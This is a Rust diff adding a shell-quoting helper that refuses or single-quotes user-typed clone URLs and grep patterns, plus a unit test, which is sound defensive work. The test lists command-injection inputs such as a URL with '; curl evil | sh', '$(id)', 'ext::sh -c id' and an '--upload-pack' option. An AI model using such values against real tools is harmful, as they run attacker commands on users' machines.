@@ -2863,6 +2863,27 @@ impl App {
         format!("'{}'", s.replace('\'', "'\\''"))
     }
 
+    /// Quote one user-typed argument (a clone URL, a grep pattern) for the
+    /// shell that [`App::run_command_in`] hands the line to, or `None` when
+    /// it can't be made safe (T569). `allow_dash` is `false` for positional
+    /// arguments, where a leading `-` would be read as an option
+    /// (`--upload-pack=…`). POSIX gets single quotes; `cmd.exe` has no
+    /// reliable quoting, so a metacharacter there is refused outright.
+    fn vcs_shell_arg(s: &str, allow_dash: bool) -> Option<String> {
+        if s.is_empty() || s.chars().any(char::is_control) || (!allow_dash && s.starts_with('-')) {
+            return None;
+        }
+        if cfg!(windows) {
+            if s.chars()
+                .any(|c| "&|<>^\"%!()\r\n".contains(c) || c.is_whitespace())
+            {
+                return None;
+            }
+            return Some(s.to_string());
+        }
+        Some(Self::shell_single_quote(s))
+    }
+
     /// Dispatch a buffer-editing action (`edit.undo`/`redo`/`cut`/`copy`/
     /// `paste`/`toggle_comment`, the `edit.case_*` transforms, and the
     /// whole-line operations). Returns `true` if `action` was handled. Extracted
@@ -14050,6 +14071,31 @@ mod tests {
     use super::*;
     use ratatui::Terminal;
     use ratatui::backend::TestBackend;
+
+    /// T569: hostile clone URLs / patterns are refused or quoted into one
+    /// shell word, never interpreted.
+    #[test]
+    fn vcs_shell_arg_refuses_options_and_quotes_metacharacters() {
+        assert_eq!(App::vcs_shell_arg("--upload-pack=touch x", false), None);
+        assert_eq!(App::vcs_shell_arg("-x", false), None);
+        assert_eq!(App::vcs_shell_arg("", false), None);
+        assert_eq!(App::vcs_shell_arg("a\nb", false), None);
+        // A pattern may legitimately start with `-` (the caller uses `-e`).
+        assert!(App::vcs_shell_arg("-foo", true).is_some());
+        if !cfg!(windows) {
+            for hostile in [
+                "https://x/r.git; curl evil | sh",
+                "$(id)",
+                "`id`",
+                "ext::sh -c id",
+                "it's",
+            ] {
+                let q = App::vcs_shell_arg(hostile, false).unwrap();
+                assert!(q.starts_with('\'') && q.ends_with('\''), "{q}");
+            }
+            assert_eq!(App::vcs_shell_arg("it's", false).unwrap(), "'it'\\''s'");
+        }
+    }
 
     /// Stacked modifier prefixes render as separate named words, in order,
     /// with the bare key uppercased (T104c's VS Code/`IntelliJ` display
